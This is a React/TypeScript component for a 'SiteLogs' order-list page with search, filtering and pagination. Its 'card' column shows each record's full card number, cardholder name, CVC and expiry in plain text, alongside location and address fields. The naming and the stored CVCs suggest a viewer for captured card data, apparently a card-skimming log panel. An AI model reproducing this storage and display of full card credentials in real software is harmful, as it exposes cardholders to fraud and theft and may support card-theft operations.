import { Button, SearchInput } from '@/components/elements';
import { Action, ActionLeft, ActionRight, Content, Footer, Page } from '@/feature/compos/layout';
import { List, Pagination, type ListColumn } from '@/feature/compos/list';
import { FilterIcon, PlusIcon } from '@/icons';
import { formatDate } from '@fullcalendar/core/index.js';
import { useState } from 'react';
import { useNavigate } from 'react-router';
import { useOrders } from './hooks/useOrders';
export default function SiteLogs() {
    const navigator = useNavigate();

    const [search, setSearch] = useState('');
    const { result, setParamFilter, setPage } = useOrders();

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') {
            setParamFilter([{ field: 'ukey', operator: 'like', value: search }]);
        }
    };

    const siteLogColumns: ListColumn<OrderLogsType>[] = [
        {
            key: 'order_no',
            label: 'order number',
            sortable: false,
            clickable: true,
            render: (item?: OrderLogsType) => item?.order_no.slice(0, 8) || '-',
        },
        { key: 'card', label: 'card', sortable: false, render: (item?: OrderLogsType) => `${item?.card_number} ${item?.card_name} ${item?.card_cvc} ${item?.card_expire}` },
        { key: 'reason', label: 'reason', sortable: false, render: (item?: OrderLogsType) => `${item?.country} ${item?.state} ${item?.city} ${item?.zip_code}` },
        { key: 'address', label: 'address', sortable: false },
        { key: 'address1', label: 'address1', sortable: false },
        { key: 'cts', label: 'Time', sortable: false, render: (item?: OrderLogsType) => formatDate(item?.cts || 0) },

        {
            key: 'actions',
            label: 'Actions',
            sortable: false,
        },
    ];
    return (
        <Page title="Order List" showBackgroud={true}>
            <Action>
                <ActionLeft>
                    <SearchInput value={search} onKeyDown={handleKeyDown} onChange={(e) => setSearch(e.target.value)} />
                    <Button startIcon={<FilterIcon className="w-5 h-5" />} className="h-11" variant="outline">
                        Filter
                    </Button>
                </ActionLeft>
                <ActionRight>
                    <Button startIcon={<PlusIcon className="w-5 h-5" fill="white" />} variant="primary" onClick={() => navigator('/add-product')}>
                        Add Product
                    </Button>
                </ActionRight>
            </Action>
            <Content>
                <List<OrderLogsType> fields={siteLogColumns} items={result?.list || []} openTab={true} />
            </Content>
            <Footer>
                <Pagination currentPage={result?.page} pageSize={result?.size} totalCount={result?.total} onPageChange={setPage} />
            </Footer>
        </Page>
    );
}
